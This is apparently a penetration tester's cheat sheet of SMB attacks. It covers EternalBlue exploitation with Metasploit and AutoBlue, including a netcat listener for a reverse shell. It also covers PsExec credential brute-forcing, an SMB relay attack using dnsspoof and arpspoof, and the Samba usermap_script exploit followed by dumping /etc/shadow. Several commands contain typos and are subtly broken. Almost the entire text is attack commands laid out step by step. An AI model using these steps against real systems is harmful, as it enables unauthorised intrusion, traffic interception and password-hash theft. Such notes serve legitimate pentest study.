# Eternal Blue

## Scan to check if vulnerable
nmap -sV -p 445 --script=sbm-vuln-ms17-010 TARGET

## Metasploit
search eternalblue

(Scanner) auxiliary/scanner/smb/smb_ms17_010

(Exploit) exploit/windows/smb/ms17_010_eternalblue

## AutoBlue-MS17-010
Via github

Have to generate shellcode to exploit

Execute prior 

Generate a stageless payload 

Start netcat listener 
  Nc -nvlp 1234 (port you set up prior)
  
In the eternalblue_exploit directory in a different prompt
  Change mod
  Python eternalblue_exploit7.py TARGET shellcode/sc_x64.bin
  
Will have a connection in the netcat terminal 

# PsExec

(Scan to find supported protocoles and dialets of server) 

nmap -p445 --script smb-protocols TARGET

## start metasploit for login

auxiliary/scanner/smb/smb_login -> set User and Pass File

## Authenticate 

psexec.py user@TARGET cmd.exe (COMMAND)

## Authenticate with metasploit

search psexec
choose module: exploit/windows/smb/psexec -> set SMBuser and SMBpass

# Relay Attack

Start metasploit

search smb_relay

Choose module: exploit/windows/smb/smbrelay -> set SRVHOST, LHOST, SMBHOST

In another tab: 

Echo “TARGET_IP *.DOMAIN” > dns

Point request for domain to our kali linux system

Dnsspoof -i eth1 -f dns

In another tab: 

Enable ip forwarding: Echo 1 > /proc/sys/net/ipv4/ip forward

Arpspoof -i eth1 -t IP GATEWAY

In another tab:

Arp spoof attack: Arspoof -i eth1 -t GATEWAY IP

## SAMBA

Msfconsole 

Search smb_version 

Use auxiliary/scanner/smb/smb_version

set/show options 

Searchsploit the samba version (in another terminal)

Search samba version (back in original)

Choose exploit/multi/samba/usermap_script 

show/set options 

Exploit 

Cntrl Z

Sessions 

Sessions -u 1

List out users: Cat /etc/password

List out hashes: Cat /etc/shadow
